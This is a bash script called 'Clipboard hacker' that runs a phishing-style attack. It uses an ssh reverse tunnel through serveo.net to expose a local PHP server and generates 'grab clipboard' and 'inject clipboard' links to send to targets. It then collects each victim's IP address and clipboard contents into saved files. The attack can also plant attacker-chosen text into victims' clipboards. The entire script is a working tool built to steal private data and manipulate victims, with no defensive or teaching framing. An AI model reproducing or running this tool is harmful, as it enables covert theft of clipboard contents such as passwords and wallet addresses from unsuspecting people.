#!/bin/bash
#coded by Anonycodexia
clear
trap 'printf "\n";stop' 2

banner() {

printf "\e[1;77m      ____ _ _      \e[0m\e[1;92m   _   _      _     _\e[0m\n"
printf "\e[1;77m     / ___| (_)_ __ \e[0m\e[1;92m  | | | | ___(_)___| |_\e[0m\n"
printf "\e[1;77m    | |   | | | '_ \ \e[0m\e[1;92m | |_| |/ _ \ / __| __|\e[0m\n"
printf "\e[1;77m    | |___| | | |_) |\e[0m\e[1;92m |  _  |  __/ \__ \ |_\e[0m\n"
printf "\e[1;77m     \____|_|_| .__/\e[0m\e[1;92m  |_| |_|\___|_|___/\__|\e[0m\n"
printf "\e[1;77m              |_|   \e[0m\e[1;92m                     \e[0m\n"
printf "\n"
printf " \e[1;77m    Clipboard hacker Coded by Anonycodexia\e[0m \n"

printf "\n"


}

stop() {

checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt

printf "\n"
rm -rf iptracker.log
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] \e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"

}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the grab clipboard link!\n"
catch_ip
rm -rf ip.txt
fi

if [[ -e "ip2.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the inject clipboard link!\n\e[0m"


ip=$(grep -a 'IP:' ip2.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip2.txt >> saved.ip2.txt

printf "\n"
rm -rf iptracker.log

rm -rf ip2.txt

fi


sleep 0.5

if [[ -e "clipboard.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target's Clipboard received:\e[0m\n"
printf "\n\e[1;77m"
cat clipboard.txt
printf "\n\e[0m"
touch clipboard_backup.txt
cat clipboard.txt >> clipboard_backup.txt
rm -rf clipboard.txt
printf "\n\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m clipboard_backup.txt\e[0m\n"
fi
sleep 0.5

done 

}


server() {


printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net -R '$ddefault_port1':localhost:4444 2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$ddefault_port1':localhost:4444 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Grab clipboard link:\e[0m\e[1;77m %s\n' $send_link
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Inject clipboard link:\e[0m\e[1;77m %s/index1.php\n' $send_link


}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

echo "Do you want inject into clipboard ?"
read clipboard
if [[ $clipboard = yes ]]; then
read -p "Enter the text that you want to inject: " anonycodexia
sed "s/'[^']*'/'$anonycodexia'/g" "inject" > "copy.html"
fi


printf "\n"
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Serveo (Grab/Inject clipboard link)\e[0m\n"


command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

clear
start1


}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' cliptext.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
sed 's+forwarding_link+'$send_link'+g' template2.php > index1.php
sed 's+serveo_port+'$ddefault_port1'+g' copy.html > index1.html

}

start() {

default_choose_sub="Y"
default_subdomain="clipboardme$RANDOM"
default_port1=$RANDOM
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Serveo (Forwarding) Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_port1
read ddefault_port1
ddefault_port1="${ddefault_port1:-${default_port1}}"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}



banner
dependencies
start1

